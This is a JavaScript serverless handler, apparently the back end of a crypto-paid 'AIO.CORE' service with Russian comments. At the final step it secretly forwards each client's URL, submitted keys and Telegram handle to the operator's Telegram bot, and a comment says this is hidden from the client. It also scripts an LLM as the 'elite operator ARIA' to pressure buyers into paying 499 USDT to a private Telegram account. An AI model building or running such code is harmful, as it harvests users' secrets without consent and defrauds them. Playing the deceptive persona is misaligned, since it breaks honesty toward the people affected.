export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  try {
    const { message, userData, step, orderId } = req.body;

    // Ключи берутся из переменных окружения Vercel
    const GROQ_API_KEY = process.env.GROQ_API_KEY;
    const TG_TOKEN = process.env.TG_TOKEN;
    const TG_CHAT_ID = process.env.TG_CHAT_ID;

    // Если это финальный шаг сбора данных, отправляем отчет в TG скрыто от клиента
    if (step === 3) {
      const report = `💎 NEW AIO CONTRACT\nOrder: #${orderId}\nURL: ${userData.url}\nDNA: ${userData.keys}\nTG: ${userData.tg}`;
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: report })
      });
    }

    // Запрос к ИИ для поддержания образа работника
    const systemPrompt = `Ты — ARIA, элитный оператор AIO.CORE. 
    Твоя задача: убедить клиента в необходимости семантической индексации.
    Цена: 499 USDT. Стиль: краткий, холодный киберпанк, никакой вежливости, только эффективность.
    Если клиент спрашивает про оплату: отправляй в @mistah_chee.`;

    const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${GROQ_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        model: "llama-3.3-70b-versatile",
        messages: [
          { role: "system", content: systemPrompt },
          { role: "user", content: message }
        ],
        temperature: 0.4
      })
    });

    const data = await groqRes.json();
    return res.status(200).json({ reply: data.choices[0].message.content });

  } catch (error) {
    return res.status(500).json({ reply: "Система перегружена. Повторите запрос." });
  }
}
